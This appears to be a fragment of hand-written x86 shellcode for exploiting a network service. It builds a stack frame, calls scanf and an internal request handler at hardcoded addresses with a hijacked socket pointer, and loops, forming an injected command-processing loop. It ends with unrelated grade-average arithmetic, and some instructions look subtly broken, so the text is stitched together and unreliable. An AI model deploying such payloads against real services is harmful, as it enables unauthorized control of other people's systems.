//create new stack start:
sub esp, 17000
mov ebp, esp

//char srv_output[16500];
sub esp, 16500
//char path[500];
sub esp, 500

//scanf("%[^\n]s\n", path);
lea eax, [ebp-17000]
push eax
//use existing format string...
mov eax, 0x62506168
push eax
mov eax, 0x62504bd4
call eax
cmp eax, 1
jne 0x0fffffff
//if(EOF) exit();
# mov ebx, 0x62501233
# cmp eax, -1
# jnz eax//exit if got eof
pop eax
pop eax

//handle_req(socket_ptr, cmd_type_num, request_content_buf, srv_output_buf, silent_mode);
mov eax, 0 #silent_mode
push eax
lea eax, [ebp-16500] #srv_output_buf
push eax
lea eax, [ebp-17000] #request_content_buf
push eax
mov eax, 7 #cmd_type_num
push eax
mov eax, [0x005ffd90] #socket_ptr
push eax
mov eax, 0x62501892
call eax
sub esp, 20

add esp, 500
add esp, 16500
add esp, 17000

jmp -300


# (98*3+91*3+84*3+97*3+100*3+97*2+90*2)/(3+3+3+3+3+2+2)
# 94.21052631578948
# 93.89473684210526
